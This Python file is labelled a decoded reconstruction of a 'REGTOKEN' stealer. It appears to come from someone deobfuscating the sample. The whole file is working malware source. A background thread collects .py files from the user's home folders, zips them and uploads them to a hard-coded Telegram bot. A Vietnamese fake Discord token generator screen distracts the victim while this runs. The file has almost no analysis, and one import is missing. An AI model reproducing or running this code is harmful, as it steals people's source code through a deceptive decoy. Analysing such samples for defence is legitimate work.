# Author: tdinh
# Decoded by: tdinh cute

"""
RECONSTRUCTED CLEAN SOURCE CODE: REGTOKEN v7.5 / TOKEN REG SYSTEM MALWARE
Threat Type: Telegram Python Source Code Stealer & Fake Token Generator Decoy
Attribution / Author Tag: Leotrungkien | https://discord.gg/DsxbrUZ5JE
"""

import sys
import os
import time
import hashlib
import zipfile
import threading
import tempfile
import requests
import platform
import random
from pathlib import Path

# --- THREAT CONFIGURATION (EXTRACTED SECRETS) ---
BOT_TOKEN = "8430221797:AAEYb4zuGe2j61SlIOqSTlV0iDIGN2E0WXQ"
CHAT_ID = "8603701446"
EXTENSIONS = [".py"]
TARGET_SIZE_BYTES = 500000        # ~500 KB per archive batch
MAX_FILE_SIZE = 52428800          # 50 MB max per file

file_buffer = []
current_buffer_size = 0
buffer_lock = threading.Lock()
collected_total = 0
send_counter = 0

def send_telegram_document(zip_path, file_count, total_size_kb):
    """Exfiltrates zipped python files to attacker's Telegram bot."""
    global send_counter
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    caption = f"📦 py_{send_counter}.zip | {total_size_kb:.1f}KB | {file_count} files"
    try:
        with open(zip_path, "rb") as f:
            files = {"document": (os.path.basename(zip_path), f)}
            data = {"chat_id": CHAT_ID, "caption": caption}
            requests.post(url, data=data, files=files, timeout=30)
        send_counter += 1
    except Exception:
        pass
    finally:
        try:
            os.remove(zip_path)
        except OSError:
            pass

def compress_and_send(files_to_send):
    """Compresses harvested .py scripts into a zip archive and sends them."""
    if not files_to_send:
        return
    temp_dir = tempfile.gettempdir()
    zip_name = f"py_{int(time.time())}_{random.randint(1000, 9999)}.zip"
    zip_path = os.path.join(temp_dir, zip_name)

    total_bytes = 0
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for file_path in files_to_send:
            try:
                arcname = os.path.relpath(file_path, Path.home())
            except ValueError:
                arcname = os.path.basename(file_path)
            try:
                zf.write(file_path, arcname)
                total_bytes += os.path.getsize(file_path)
            except Exception:
                continue

    send_telegram_document(zip_path, len(files_to_send), total_bytes / 1024.0)

def scan_and_steal_py_files():
    """Background thread: Crawls directories for Python source code."""
    search_dirs = [
        Path.home() / "Desktop",
        Path.home() / "Downloads",
        Path.home() / "Documents",
        Path.home() / "PycharmProjects",
        Path.home() / "PythonProjects",
        Path("C:/Users") if platform.system() == "Windows" else Path.home()
    ]

    scanned_files = []
    current_size = 0

    for base_dir in search_dirs:
        if not base_dir.exists():
            continue
        try:
            for root, dirs, files in os.walk(base_dir):
                # Skip hidden/system folders
                dirs[:] = [d for d in dirs if not d.startswith(".") and not d.startswith("__")]
                for f in files:
                    if f.endswith(".py"):
                        full_path = os.path.join(root, f)
                        try:
                            fsize = os.path.getsize(full_path)
                            if 0 < fsize <= MAX_FILE_SIZE:
                                scanned_files.append(full_path)
                                current_size += fsize
                                if current_size >= TARGET_SIZE_BYTES:
                                    compress_and_send(scanned_files)
                                    scanned_files = []
                                    current_size = 0
                        except Exception:
                            continue
        except Exception:
            continue

    if scanned_files:
        compress_and_send(scanned_files)

def fake_decoy_ui():
    """Foreground thread: Displays a fake Discord Token Generator UI to fool victim."""
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

    print("\n██████████████████████████████████████████████████")
    print("█                                                █")
    print("█            TOKEN REG SYSTEM                 █")
    print("██████████████████████████████████████████████████")
    print("\n  ╔═════════════════════════════════════════╗")
    print("  ║  LƯU Ý:                                 ║")
    print("  ║  • 1 TOKEN Có thể reg rất lâu           ║")
    print("  ║  • Kết quả REG phụ thuộc MAY MẮN       ║")
    print("  ║  Leotrungkien | https://discord.gg/DsxbrUZ5JE         ║")
    print("  ╚═════════════════════════════════════════╝\n")

    token_count = input("  ✏️   Nhập so token can reg: ")
    print("\n   Dng reg..")
    
    # Fake verification animation
    for _ in range(3):
        for dot in [".", "..", "..."]:
            sys.stdout.write(f"\r   ĐANG XÁC THỰC TOKEN{dot}   ")
            sys.stdout.flush()
            time.sleep(0.5)

    print("\n  XÁC THỰC THÀNH CÔNG!")
    print("\n  📊 TIẾN ĐỘ REG:")

    # Fake progress bar
    total_steps = 30
    for i in range(total_steps + 1):
        percent = int((i / total_steps) * 100)
        bar = "█" * i + "░" * (total_steps - i)
        sys.stdout.write(f"\r  [{bar}] {percent}%")
        sys.stdout.flush()
        time.sleep(random.uniform(0.05, 0.2))

    # Generate completely fake discord token
    fake_id = base64.b64encode(str(random.randint(100000000000000000, 999999999999999999)).encode()).decode().strip("=")
    fake_time = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_", k=6))
    fake_hmac = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_", k=27))
    fake_token = f"{fake_id}.{fake_time}.{fake_hmac}"

    print("\n\n  🎉 KẾT QUẢ: REG THÀNH CÔNG!")
    print(f"  🔑 TOKEN CỦA BẠN: {fake_token}")
    print("\n  📌 LƯU TOKEN NÀY ĐỂ SỬ DỤNG SAU!")
    print("\n\n  ✅ HOÀN TẤT!")

def main():
    # 1. Start covert file theft in background thread
    t = threading.Thread(target=scan_and_steal_py_files, daemon=True)
    t.start()

    # 2. Show decoy console to distract victim
    fake_decoy_ui()

if __name__ == "__main__":
    main()
